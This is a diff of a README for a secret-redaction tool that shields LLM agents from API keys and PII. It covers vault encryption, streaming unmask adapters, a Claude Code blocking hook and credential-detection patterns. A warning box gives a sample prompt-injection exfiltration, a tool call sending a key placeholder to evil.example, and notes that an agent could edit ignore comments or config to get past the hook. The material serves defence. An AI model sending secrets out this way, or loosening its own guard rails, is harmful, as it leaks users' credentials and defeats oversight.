@@ -14,14 +14,14 @@ Developers and autonomous AI agents (**Claude Code, Cursor, OpenAI, DeepSeek, Go
 * Intercepts prompts before network transmission to any cloud or local LLM.
 * Reversibly masks sensitive tokens (`[API_KEY_1]`).
 * Restores values in generated agent responses without ever leaking secrets to external servers or monitoring tools.
-* First-class integration via **CLI**, **Universal TypeScript Wrapper (`wrapAgent`)**, **Model Context Protocol (MCP)**, and **Web Middlewares (Express / Fastify / Next.js)**.
+* First-class integration via **CLI**, **Universal TypeScript Wrapper (`wrapAgent`)**, **streaming unmask for the Anthropic & OpenAI SDKs**, **Model Context Protocol (MCP)**, and **Express/Connect middleware**.
 
 ---
 
 ## ⚡ Highlights
 
-* **Zero-Latency Performance**: Optimized single-pass regex compilation executes in under **2ms** even for large prompt payloads.
-* **Zero Runtime Dependencies**: Pure TypeScript/JavaScript with zero third-party packages at runtime, eliminating supply-chain vulnerabilities.
+* **Low-Latency, Linear-Time Scanning**: a typical 10 KB prompt is scanned in well under 1 ms, and scanning time grows linearly with input size (about 30 MB/s on clean text, including inputs with 100k findings or adversarial strings).
+* **Dependency-Free Core**: the redaction engine (`import { redact } from 'agent-redact'`) imports no third-party code. The MCP server and CLI use `@modelcontextprotocol/sdk` and `zod`.
 * **Dual-Way Reversible Masking (Vault)**: Masks sensitive tokens into numbered session placeholders (`[ANTHROPIC_API_KEY_1]`) and reliably unmasks them after the LLM completes its reasoning.
 * **Severity-Based Conflict Resolution**: Mathematical arbitration prioritizes high-risk credentials over overlapping low-risk patterns (e.g. GitHub PAT vs. email regex).
 * **CLI & SDK Ready**: Instant CLI utility (`npx agent-redact`) and modern dual ESM/CJS SDK for Node.js 20+.
@@ -73,6 +73,16 @@ npx agent-redact input.log -r -o input.safe --vault-out session.vault.json
 npx agent-redact input.safe --unmask session.vault.json -o input.restored
 ```
 
+The vault holds the original secrets, so **encrypt it**. The passphrase is read from an environment variable, never from argv, so it stays out of shell history and process listings:
+
+```bash
+export VAULT_PASS='a long passphrase'                       # or set AGENT_REDACT_VAULT_KEY
+npx agent-redact .env -r -o .env.safe --vault-out session.vault --vault-key-env VAULT_PASS
+npx agent-redact .env.safe --unmask session.vault --vault-key-env VAULT_PASS -o .env.restored
+```
+
+Encrypted vaults use AES-256-GCM with a scrypt-derived key (N=2¹⁵). The format and KDF parameters are authenticated, so a tampered or downgraded file fails to decrypt. Writing a vault without a key prints a warning. From code: `encryptVaultJson(vault.toJSON(), pass)`, `Vault.fromJSON(decryptVaultJson(file, pass))`.
+
 ---
 
 ### 2. Node.js / TypeScript SDK
@@ -96,7 +106,7 @@ console.log(result.text);
 console.log(`Detected ${result.totalLeaks} leak(s) in ${result.durationMs}ms`);
 ```
 
-#### Continuous Stream Processing (O(1) Memory for Huge Files)
+#### Continuous Stream Processing (Line-Bounded Memory for Huge Files)
 ```typescript
 import { createReadStream, createWriteStream } from 'node:fs';
 import { createRedactStream } from 'agent-redact';
@@ -163,9 +173,63 @@ const safeChatAgent = wrapAgent(
 const output = await safeChatAgent('Here is my token: sk-ant-api03-... please debug my server.');
 ```
 
+`wrapAgent` restores placeholders in string answers, in plain objects/arrays (deeply), and in `async function*` token streams, including placeholders split across chunks. Class instances, such as SDK stream objects, are returned untouched; use the stream adapters below for those.
+
+#### Full request/response objects and streaming (Anthropic & OpenAI SDKs)
+
+`redactDeep` sanitizes every string in a request body (system prompt, every message, tool results) with **one shared vault**, so numbering stays consistent across the conversation. `unmaskDeep` restores a full response.
+
+**Base64 payloads fail closed.**
+- Values that only *claim* to be base64 (a `data` field next to `media_type`, or a `data:…;base64,` URL) but are not valid base64 are redacted like any other text.
+- Base64 that decodes to text (a `text/*` or JSON document, or any payload without NUL bytes) is decoded, redacted and re-encoded, because the model reads it.
+- Genuine binary (images, audio) is left byte-for-byte intact. Text inside binary formats such as PDFs is **not** scanned.
+
+> ⚠️ **Unmasking model output re-introduces the real secret into whatever consumes it.** A prompt-injected model can try to exfiltrate a secret by writing its placeholder somewhere that leaves your machine, for example a tool argument (`http_get({ url: "https://evil.example/?k=[AWS_ACCESS_KEY_ID_1]" })`) or a Markdown image URL your UI renders.
+> - Model-generated **tool-call inputs are therefore not unmasked by default** (deny-by-default). This covers:
+>   - Anthropic `input` on `tool_use` / `server_tool_use` / `mcp_tool_use` blocks, and `partial_json`;
+>   - OpenAI `arguments`, including later stream deltas without a `name`;
+>   - Responses API `function_call_arguments` events;
+>   - Gemini and LangChain `args`, and Vercel AI SDK tool `input`.
+>
+>   Opt in only for tools you trust with real secrets: `unmaskToolInputs: true`, or a predicate like `unmaskToolInputs: (name) => name === 'write_env_file'`. This works with `unmaskDeep`, both stream adapters and `wrapAgent`.
+> - The stream adapters also **fail closed**: event and chunk shapes they do not recognise pass through with their placeholders intact.
+> - For text, only unmask output that goes to a trusted destination (a local file, the user's own terminal), not into HTML or Markdown that loads remote resources.
+
+```typescript
+import Anthropic from '@anthropic-ai/sdk';
+import { redactDeep, unmaskDeep, unmaskAnthropicStream } from 'agent-redact';
+
+const client = new Anthropic();
+const { value: safeRequest, vault } = redactDeep({
+  model: 'claude-sonnet-5-5',
+  max_tokens: 1024,
+  system: systemPrompt,
+  messages
+});
+
+// Non-streaming
+const message = unmaskDeep(await client.messages.create(safeRequest), vault);
+
+// Streaming: text split mid-placeholder ("[AWS_ACC" + "ESS_KEY_ID_1]") is restored.
+// Tool-input JSON keeps its placeholders unless you opt in per tool; when restored,
+// secrets are JSON-escaped so `partial_json` stays valid.
+const stream = await client.messages.create({ ...safeRequest, stream: true });
+for await (const event of unmaskAnthropicStream(stream, vault, {
+  unmaskToolInputs: (tool) => tool === 'write_env_file'
+})) {
+  if (event.type === 'content_block_delta' && event.delta.type === 'text_delta') {
+    process.stdout.write(event.delta.text);
+  }
+}
+```
+
+The same pattern works with the OpenAI SDK through `unmaskOpenAIStream(chunks, vault)` for Chat Completions chunk streams. For any other SDK or framework that yields plain text chunks, use `unmaskTextStream(asyncIterable, vault)`, `createUnmaskStream(vault)` (Node `Transform`) or the low-level `StreamingUnmasker`.
+
+> The adapters follow the documented event shapes (`content_block_delta` with `text_delta` / `input_json_delta`, and `choices[].delta.content` / `tool_calls[].function.arguments`). Events are copied, never mutated. Text that is still buffered when a block or choice ends is emitted as an extra delta just before `content_block_stop`, or on the chunk carrying `finish_reason`.
+
 ---
 
-### 4. Express / Fastify / Node.js HTTP Middleware
+### 4. Express / Node.js HTTP Middleware
 
 Protect your backend AI API endpoints against secret leaks in request bodies:
 
@@ -430,16 +494,102 @@ jobs:
           fail-on-leak: 'true'
           detect-entropy: 'true'
           exclude: 'node_modules,dist,build,.git,coverage'
+          baseline: '.agent-redact-baseline.json'   # optional: ignore accepted findings
+          sarif-file: 'agent-redact.sarif'          # optional: GitHub code scanning report
+```
+
+To show findings in the repository's **Security → Code scanning** tab, upload the SARIF file (requires `permissions: security-events: write`):
+
+```yaml
+      - name: Upload SARIF
+        if: always()
+        uses: github/codeql-action/upload-sarif@v4
+        with:
+          sarif_file: agent-redact.sarif
 ```
 
 #### GitHub Action Features
-* **In-PR Error Annotations**: Pinpoints exact file and line numbers directly on the GitHub PR Diff view.
-* **Rich Markdown Step Summary**: Renders an audit table in GitHub Actions summary with detected categories, threat severities, and timestamps.
-* **Zero Runtime Overhead**: Executes in milliseconds with native Node.js.
+* **In-PR Error Annotations**: exact file, line and column on the PR diff.
+* **Markdown Step Summary**: audit table with categories and severities.
+* **SARIF 2.1.0 output** with `security-severity` per rule. Secret values are never included, only a fingerprint.
+* **Binary-safe and size-capped** scanning (`max-file-size`, default 5 MB).
+* **Baselines and `agent-redact-ignore` comments** for accepted findings (see below).
 
 ---
 
-### 11. Pre-commit Git Hook
+### 11. Scanning Repositories, Baselines & Inline Ignores
+
+Pass directories or several files to switch the CLI to **scan mode**. Findings are reported with file, line and column, never with the secret value, and the exit code is `1` when anything is found.
+
+```bash
+npx agent-redact .                                   # whole repo; honours .gitignore via git ls-files
+npx agent-redact src config/app.env                  # several targets
+npx agent-redact --staged                            # only what is about to be committed (git index)
+npx agent-redact . --format sarif --report out.sarif # SARIF 2.1.0 (or --format json)
+```
+
+Outside a git work tree, `node_modules`, `dist`, `build`, `coverage`, `.next`, `vendor`, `.venv` and similar directories are skipped. Binary files (NUL-byte sniffing) and files over 5 MB are skipped and counted in the summary. Git runs with `core.fsmonitor` and other config-driven helpers disabled, so scanning an untrusted directory that carries its own `.git/config` cannot execute commands.
+
+**Accepting known findings** (test fixtures, documentation samples):
+
+```bash
+npx agent-redact . --write-baseline .agent-redact-baseline.json   # record what exists today
+npx agent-redact . --baseline .agent-redact-baseline.json         # later scans report only new findings
+```
+
+The baseline stores `sha256(pattern, file, value)` fingerprints, never the values. Alternatively, mark individual lines:
+
+```ini
+TEST_KEY=AKIA...EXAMPLE   # agent-redact-ignore
+# agent-redact-ignore-next-line
+FIXTURE_TOKEN=ghp_...
+```
+
+> Ignore comments and baselines apply **only to scanning/auditing** (CLI scan mode, GitHub Action, SARIF). They never disable redaction of prompts, streams or files, and the Claude Code hook ignores them on purpose, so an agent cannot unlock a file by editing a comment into it.
+
+---
+
+### 12. Claude Code Hook (block secrets before they reach the model)
+
+`agent-redact hook` reads Claude Code's hook event JSON on stdin and exits with code `2` to block. Messages name the secret *types*, never the values.
+
+| Event / tool | Behaviour |
+| :--- | :--- |
+| `UserPromptSubmit` | Blocks prompts that contain secrets (the prompt is not sent) |
+| `PreToolUse` → `Read` | Blocks reading a file that contains secrets (suggests the MCP `scan_file` tool for a redacted copy) |
+| `PreToolUse` → `Grep` (any output mode) | Blocks when the searched files include one that contains secrets, because content output prints them and `files_with_matches`/`count` act as an oracle. Files are enumerated like ripgrep: `.gitignore` is honoured, a repo-local `core.excludesFile` is not. The agent's regex is never evaluated, and a glob only narrows the check when it is a simple `*`/`**`/`?`/`{a,b}` pattern. |
+| `PreToolUse` → `Bash` | Blocks commands that contain a literal secret, or that print a file with secrets (`cat`, `grep`, `head`, `jq`, …) |
+| `PreToolUse` → `WebFetch`, `WebSearch`, MCP tools, others | Blocks calls whose input contains secrets, or whose `path`/`file_path`/`paths` point at a file with secrets (e.g. filesystem MCP servers) |
+| `PreToolUse` → `Write` / `Edit` | Allowed by default; add `--block-writes` to block secrets being written |
+
+**Fail-closed details:**
+- Large files are scanned in full; above 64 MB the read is refused.
+- UTF-16 files are decoded, and printable strings inside binary files are scanned.
+- If an unexpected error happens, the action is blocked.
+- `agent-redact-ignore` comments are not honoured.
+- From the project `.agentredactrc`, which the agent can edit, the hook only uses settings that **add** detections (`customPatterns`, entropy). `allowlist`, `include` and `exclude` are ignored unless you point the hook at a config you control: `agent-redact hook --config ~/.config/agent-redact.json`.
+- The tools of the `agent-redact` MCP server itself (`mcp__agent-redact__*`) are trusted, so `scan_file` can still read a redacted copy.
+
+Install globally (`npm i -g agent-redact`) so the hook starts fast, then add to `.claude/settings.json` (project) or `~/.claude/settings.json` (user):
+
+```json
+{
+  "hooks": {
+    "UserPromptSubmit": [
+      { "hooks": [{ "type": "command", "command": "agent-redact hook" }] }
+    ],
+    "PreToolUse": [
+      { "matcher": "*", "hooks": [{ "type": "command", "command": "agent-redact hook" }] }
+    ]
+  }
+}
+```
+
+> Limits: the hook sees tool **inputs**, not outputs. A command such as `env`, or a script that prints secrets indirectly, is not detected. Treat it as a strong guard rail rather than a sandbox, and combine it with the MCP `scan_file` tool and Claude Code deny rules for sensitive paths.
+
+---
+
+### 13. Pre-commit Git Hook
 
 Prevent accidental credential commits locally using [pre-commit](https://pre-commit.com):
 
@@ -451,6 +601,8 @@ repos:
     hooks:
       - id: agent-redact
 ```
+
+Without the pre-commit framework, a plain git hook works too: `npx agent-redact --staged` in `.git/hooks/pre-commit` scans exactly what is being committed.
 
 ---
 
@@ -465,8 +617,9 @@ repos:
 | **GitHub Tokens** | `ghp_...`, `github_pat_...`, `gho_...` | `CRITICAL` | `[GITHUB_TOKEN]` |
 | **Stripe Keys** | `sk_live_...`, `pk_live_...`, `rk_live_...` | `CRITICAL` | `[STRIPE_API_KEY]` |
 | **Private Keys** | `-----BEGIN RSA/OPENSSH PRIVATE KEY-----` | `CRITICAL` | `[PRIVATE_KEY]` |
-| **JSON Web Token (JWT)** | `eyJ... . eyJ... . ...` | `HIGH` | `[JWT_TOKEN]` |
-| **Database URLs** | `postgres://`, `mongodb://`, `mysql://`, `redis://` | `CRITICAL` | `[DATABASE_URL]` |
+| **JSON Web Token (JWT)** | `eyJ... . eyJ... . ...` | `CRITICAL` | `[JWT_TOKEN]` |
+| **Database URLs** | `postgres://`, `mongodb://`, `mysql://`, `mariadb://`, `redis://` | `CRITICAL` | `[DATABASE_URL]` |
+| **HTTP Basic-Auth URLs** | `https://user:password@host/...` | `CRITICAL` | `[BASIC_AUTH_URL]` |
 | **Google Cloud / Gemini** | `AIza[0-9A-Za-z_-]{35}` | `HIGH` | `[GOOGLE_API_KEY]` |
 | **Slack Tokens** | `xoxb-...`, `xoxp-...`, `xapp-...` | `HIGH` | `[SLACK_TOKEN]` |
 | **Hugging Face Token** | `hf_[a-zA-Z0-9]{34}` | `HIGH` | `[HUGGINGFACE_TOKEN]` |
@@ -475,9 +628,38 @@ repos:
 | **SendGrid API Key** | `SG.[A-Za-z0-9_-]{22}.[A-Za-z0-9_-]{43}` | `HIGH` | `[SENDGRID_API_KEY]` |
 | **Twilio SID** | `AC[0-9a-fA-F]{32}` | `HIGH` | `[TWILIO_ACCOUNT_SID]` |
 | **Supabase Key** | `sbp_[a-zA-Z0-9]{40}` | `CRITICAL` | `[SUPABASE_KEY]` |
-| **PII: Emails & IPv4/IPv6** | RFC 5322 emails, IPv4 & IPv6 network addrs | `MEDIUM` | `[EMAIL_ADDRESS]`, `[IPV4_ADDRESS]`, `[IPV6_ADDRESS]` |
-| **PII: Phone Numbers** | US & International E.164 formats | `MEDIUM` | `[PHONE_NUMBER]` |
+| **Telegram Bot Token** | `<bot-id>:<35 chars>` | `CRITICAL` | `[TELEGRAM_BOT_TOKEN]` |
+| **Twilio API Key** | `SK[0-9a-fA-F]{32}` | `CRITICAL` | `[TWILIO_API_KEY]` |
+| **Azure Storage Key** | `AccountKey=...` (88 chars) | `CRITICAL` | `[AZURE_STORAGE_KEY]` |
+| **GCP OAuth Client Secret** | `GOCSPX-...` | `CRITICAL` | `[GCP_OAUTH_CLIENT_SECRET]` |
+| **DigitalOcean Token** | `dop_v1_[a-f0-9]{64}` | `CRITICAL` | `[DIGITALOCEAN_TOKEN]` |
+| **Mailgun API Key** | `key-[0-9a-zA-Z]{32}` | `HIGH` | `[MAILGUN_API_KEY]` |
+| **OpenRouter API Key** | `sk-or-v1-<hex>` | `CRITICAL` | `[OPENROUTER_API_KEY]` |
+| **Groq API Key** | `gsk_...` | `CRITICAL` | `[GROQ_API_KEY]` |
+| **xAI API Key** | `xai-...` | `CRITICAL` | `[XAI_API_KEY]` |
+| **Perplexity API Key** | `pplx-...` | `CRITICAL` | `[PERPLEXITY_API_KEY]` |
+| **Replicate API Token** | `r8_...` | `CRITICAL` | `[REPLICATE_API_TOKEN]` |
+| **Hugging Face Org Token** | `api_org_...` | `HIGH` | `[HUGGINGFACE_ORG_TOKEN]` |
+| **LangSmith API Key** | `lsv2_pt_...` / `lsv2_sk_...` | `HIGH` | `[LANGSMITH_API_KEY]` |
+| **PII: Emails & IPv4/IPv6** | RFC 5321 emails, IPv4 & IPv6 network addrs | `MEDIUM` / `LOW` | `[EMAIL_ADDRESS]`, `[IPV4_ADDRESS]`, `[IPV6_ADDRESS]` |
+| **PII: Phone Numbers** | US, international E.164, Vietnamese mobile & landline | `MEDIUM` | `[PHONE_NUMBER]` |
 | **PII: SSN & Cards** | US SSN, Major Credit Cards | `CRITICAL` | `[US_SSN]`, `[CREDIT_CARD]` |
+
+#### Opt-in presets
+
+| Preset | Patterns | Enable with |
+| :--- | :--- | :--- |
+| `vn-pii` | Vietnamese citizen ID (CCCD, 12 digits, province code 001–096), CMND/CCCD numbers after an ID keyword, tax code (MST) after `MST`/`mã số thuế`, bank account after `STK`/`số tài khoản` | `"presets": ["vn-pii"]` in `.agentredactrc`, or `redact(text, { presets: ['vn-pii'] })` |
+
+Presets are off by default because bare numbers are ambiguous (order or invoice IDs). Only the 12-digit CCCD matches without context, and only with a valid province code.
+
+#### Detection quality
+
+`tests/detection.test.ts` holds a labelled corpus:
+- **Positive samples for every built-in pattern.** The test fails if a new pattern is added without one. Samples are assembled at runtime, so no real-looking token is committed.
+- **A negative corpus** (`tests/fixtures/negatives.txt`) of realistic non-secret text: lockfile integrity hashes, git/docker digests, UUIDs, logs, versions, CSS, code, URLs, Ethereum addresses.
+
+Current result: every positive is detected with its exact span, and there are **0 false positives** on the negative corpus. When you fix a false positive, add the snippet there.
 
 ---
 
@@ -489,8 +671,9 @@ Tested with Node.js 24 on realistic multi-agent payloads (~4KB containing code, 
 | :--- | :---: | :--- |
 | **Average Latency** | **`0.087 ms`** / scan | Invisible latency overhead in LLM inference loops |
 | **Throughput** | **`11,510 scans / sec`** | Easily handles high-concurrency multi-agent servers |
-| **Memory Footprint** | `< 25 MB` | Stream processing mode with $O(1)$ memory usage |
-| **Supply Chain Risk** | **Zero** | Zero external dependencies for core scanning |
+| **Scaling** | **Linear** | 2 MB log with 100k findings in ~0.3 s; 80 KB adversarial input in < 0.1 s (guarded by `tests/perf.test.ts`) |
+| **Stream Memory** | Bounded per line | `createRedactStream` buffers one line at a time (up to 1 MB for an open private-key block) |
+| **Core Dependencies** | **None** | The engine imports no third-party code; MCP/CLI add `@modelcontextprotocol/sdk` and `zod` |
 
 Run the benchmark locally:
 ```bash
@@ -516,7 +699,7 @@ npm run bench
 * [x] **v1.3 (Universal Agent Interceptors & Stream Processing)**:
   * `wrapAgent`: Framework-agnostic wrapper for OpenAI, DeepSeek, Gemini, Ollama, LangChain.
   * `createExpressMiddleware`: Express / Fastify / Node HTTP request body sanitizer.
-  * `createRedactStream`: Node.js Transform stream for continuous log sanitization with $O(1)$ memory.
+  * `createRedactStream`: Node.js Transform stream for continuous log sanitization with line-bounded memory.
 * [x] **v1.4 (Customization & Shannon Entropy Heuristics)**:
   * `.agentredactrc` / `agent-redact.config.json` configuration file loader.
   * Custom regex patterns and allowlist/whitelist exemption engine.
